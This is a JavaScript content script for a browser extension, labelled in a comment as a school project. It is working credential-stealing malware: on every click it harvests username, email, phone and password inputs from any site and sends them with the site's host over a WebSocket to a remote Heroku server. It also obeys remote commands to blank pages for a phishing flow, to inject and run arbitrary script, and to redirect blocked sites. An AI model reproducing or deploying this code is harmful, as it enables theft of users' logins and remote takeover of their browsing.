//Just in case a popular website is trying to redflag my IP
console.log("This is all for a school project!");

//Flag variable used for if they filled out popup or not.
var phishFl = "";
var userNm = "";
var passWd = "";
var id = "";
var addSite = "";
var tempJs = "";

//Connection to the server
var HOST = 'wss://projectnickname123.herokuapp.com';
var ws = new WebSocket(HOST);

chrome.storage.sync.get("id", function(ev){
  id=ev.id;
  console.log("ONLINE This user is id is " + id);
});

// This is supposed to be used to be able to add to the array depending on
// input from the server.
chrome.storage.sync.get(["values"], function(result){
  var arr = result["values"];
  var testString = window.location.host;
  console.log("BEFORE CHANGING PHISHFLAG " + phishFl);
  console.log(arr);
  for(var i = 0; i < arr.length; i++){
    if(testString.includes(arr[i])){
      window.location.replace("https://crouton.net/");
    }
  }
});

//Wait for a click on the screen
window.addEventListener("click", clickListen, false);

function clickListen (e){
  var val = document.getElementsByTagName('input');
  for(var i = 0; i < val.length; i++){

    if(val[i].type.toLowerCase() == 'email'){
        if(!(val[i].value === "" || val[i].value === null)){
          console.log("Username is " + val[i].value);
          userNm = val[i].value;
      }
    }
    else if(val[i].name.toLowerCase() == 'username'){
      if(!(val[i].value === "" || val[i].value === null)){
        console.log("Username is " + val[i].value);
        userNm = val[i].value;
      }
    }
    else if(val[i].type.toLowerCase() == 'text'){
      if(!(val[i].value === "" || val[i].value === null)){
        console.log("Username is " + val[i].value);
        userNm = val[i].value;
      }
    }
    else if(val[i].type.toLowerCase() == 'tel'){
      if(!(val[i].value === "" || val[i].value === null)){
        console.log("Username is " + val[i].value);
        userNm = val[i].value;
      }
    }

    if(val[i].type.toLowerCase() == 'password'){
      if(!(val[i].value === "" || val[i].value === null)){
        console.log("Password is " + val[i].value);
        passWd = val[i].value;
      }
    }
  }

  if((!(userNm === null || userNm === "")) && (!(passWd === null || passWd === ""))){
      sendUsername(userNm, passWd);
  }
}

/*
Helper function to send the username/password to the server
*/
function sendUsername(username, password){
  var url = window.location.host;
	var jsonPackage = {id: id, type: 'info', url: url, username:userNm, password: passWd};
  ws.send(JSON.stringify(jsonPackage));
  console.log("sent "+JSON.stringify(jsonPackage));
}

/*
This will listen for message from the background, to perform operations on the
website and code.
*/
chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
  switch(message.action){
    //Phishing attack.
    case 'phis':
      document.getElementsByTagName("BODY")[0].style.display = "none";
      var site = window.location.host;
      chrome.storage.sync.set({'webSite': site}, function(){});
      chrome.extension.sendMessage({action: 'load'}, function(response){});
      break;
    //JS exe code.
    case 'exe':
      var nodeScript = document.createElement('script');
      nodeScript.type = 'text/javascript';
      chrome.storage.sync.get("scriptExe", function(ev){
        nodeScript.appendChild(document.createTextNode(ev.scriptExe));
        document.body.appendChild(nodeScript);
      });
      break;
    case 'addL':
    //add a website to the list of blocked websites.
      chrome.storage.sync.get(["addSite", "values"], function(ev){
        var tempVals = ev["values"];
        addSite = ev.addSite;
        tempVals[tempVals.length] = addSite;
        chrome.storage.sync.set({'values': tempVals}, function(){});
      });
      break;
  }
});


/*
Helper function, used to get the website that is being blocked, while the
phishing signal is active.
*/
chrome.storage.sync.get("webSite", function(ev){
  phishFl = ev.webSite;
  if(phishFl.localeCompare(window.location.host) === 0){
      document.getElementsByTagName("BODY")[0].style.display = "none";
      chrome.extension.sendMessage({action: 'load'}, function(response){});
  }
});
